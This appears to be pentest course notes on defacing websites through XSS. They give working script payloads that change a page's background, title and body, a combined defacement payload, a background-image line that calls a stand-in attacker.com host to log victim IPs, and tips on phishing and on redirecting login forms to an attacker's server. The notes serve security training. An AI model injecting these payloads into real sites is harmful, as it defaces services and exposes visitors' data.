# Section 6 — Defacing

> Theory only. No lab.

---

## What Defacing Achieves

Visible change to the page for every visitor — typically used to:
- Claim responsibility ("Site hacked by X")
- Damage brand / share price
- Distribute political messages
- Disrupt service

Defacing is highest-impact on **stored XSS** — affects every viewer until cleaned. Reflected/DOM XSS deface only the victim who follows the link.

---

## Defacement Building Blocks

Four DOM properties cover ~95% of defacement attacks:

| Element | Property |
|---------|----------|
| Background color | `document.body.style.background` |
| Background image | `document.body.background` |
| Page title (tab) | `document.title` |
| Page content | `DOM.innerHTML` |

---

## Background Color

```html
<script>document.body.style.background = "#141d2b"</script>
```
> Sets the page background color using JavaScript. Works with hex values, color names, or `rgb()` notation. Inject via stored XSS to affect all visitors.

Use hex (`#141d2b`), named color (`"black"`), or rgb (`"rgb(20,29,43)"`).

---

## Background Image

```html
<script>document.body.background = "https://attacker.com/image.png"</script>
```
> Sets the page background image to a URL you control. Replace with your own server URL. External assets leak the victim's IP to your server — useful side channel even without a full XSS payload.

---

## Page Title

```html
<script>document.title = 'HackTheBox Academy'</script>
```
> Changes the browser tab title. Useful for phishing: make the tab look like a legitimate login page before injecting a fake form.

Changes the browser tab. Useful for phishing prep.

---

## Page Text

### Change a single element
```javascript
document.getElementById("todo").innerHTML = "New Text"
```
> Finds the element with id `todo` and replaces its content. Swap `todo` for the actual element ID on your target.

### Change with jQuery (if loaded)
```javascript
$("#todo").html('New Text');
```
> jQuery shorthand for the same operation. Only works if the page loads jQuery. Check by typing `typeof $` in the browser console.

### Replace entire body
```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```
> Replaces the entire page body. `getElementsByTagName` returns a collection; `[0]` selects the first (and only) body element.

---

## Full Defacement Payload (Combined)

```html
<script>
document.body.style.background = "#141d2b";
document.title = "Hacked";
document.getElementsByTagName('body')[0].innerHTML = 
  '<center><h1 style="color:white">Cyber Security Training</h1>' +
  '<p style="color:white">by ' +
  '<img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px"></p>' +
  '</center>';
</script>
```
> Combines background color, title, and body replacement in one payload. Build and test this locally in an HTML file first. Then minify it to a single line before injecting.

### Workflow before deploying

1. Build the HTML in a separate `.html` file
2. Open it locally to verify layout
3. **Minify to one line** (no newlines that break the JS string)
4. Wrap in `<script>` and inject

---

## Why the Original Source Still Exists

Defacement payloads modify the DOM **at runtime** — they don't rewrite the HTML stored on the server. View page source (`Ctrl+U`) shows the original markup + your script. View rendered DOM (`Ctrl+Shift+I`) shows the modified state.

Implication: incident responders can recover by reloading without your injection, but ordinary users will only see the modified DOM until the stored payload is purged.

---

## Position Matters

Your `<script>` executes when the parser reaches it. If you inject mid-page, later elements load on top of your changes. To survive subsequent rendering:

- Inject as late as possible in the DOM, OR
- Use `window.onload`:
  ```html
  <script>window.onload = function() { document.body.innerHTML = "..." }</script>
  ```
> Wraps the defacement in a `window.onload` handler. The change fires after the page fully loads, so later-rendering elements cannot overwrite it.

---

## Exam Notes

- Defacement = visible XSS impact — easy demonstration for reports, but not a real "attack" payoff (cookie theft, session hijack are higher value)
- The four properties above are enough for full defacement; everything else is styling polish
- Stored XSS + defacement = high-severity finding in a pentest report
- Always test minified HTML locally before injecting — broken JS just shows the raw `<script>` block in the page source
- Real attackers usually pair defacement with credential exfiltration — change the login form to POST to attacker's server while displaying the original look
